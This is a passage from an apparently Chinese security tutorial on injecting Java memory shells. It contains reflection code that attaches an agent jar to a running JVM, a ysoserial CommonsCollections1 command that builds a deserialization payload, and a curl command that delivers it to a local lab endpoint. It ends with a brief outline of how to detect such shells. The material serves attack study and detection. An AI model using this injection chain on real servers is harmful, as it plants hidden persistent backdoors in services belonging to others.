                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("org.example.demospring.DemoSpringApplication")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

注意上面的name.contains("org.example.demospring.DemoSpringApplication")我们需要找到对应的jvm才可以（这里激素我们前面运行起来的靶场环境）：

可以用这个进行遍历查找：

```java
public class TestAgentMain {

    public static void main(String[] args) {
        try{
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            System.out.println(toolsPath.toURI().toURL());
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List<Object> list = (java.util.List<Object>) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM Start..");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                String name = (String) displayName.invoke(o,null);
                System.out.println(name);

            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

![截图](8a23987f762b1c7d473206b9530fae35.png)

然后，这里我们的靶场需要利用反序列化进行注入。我们利用之前修改过的 ysoserial 来快速生成反序列化 payload，地址：https://github.com/KpLi0rn/ysoserial

将上面的代码保存下来，然后在 codefile: 后指定路径即可快速生成：

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 codefile:./TestAgentMain1.java > cc11demo.ser
```

然后我们利用curl将序列化后的内容打入：

```
curl -v "http://127.0.0.1:8080/vuln" --data-binary "@./cc11demo.ser"
```

然后我们访问看看：

![截图](8b722d3c3312977154656e5634091aa2.png)

成功！

## 三、内存马检测

通过上述的学习，我们可以知道在Java web中，只有被JVM加载后的类才能被调用，即使我们注入的内存马，也是需要将对应的类载入到JVM中或者在需要时反射通知JVM加载。因此，我们注入的内存马将会已被加载的class形式存于内存当中。因此，一种比较建议的思路就是通过某种方法来获取到JVM中所有已加载的class类。也就是说我们可以按照如下流程进行检测：== 注入jar包-> dump已加载class字节码->反编译成java代码-> 源码webshell检测。==

后续的检测内容可以参考我的下一篇博客！！！
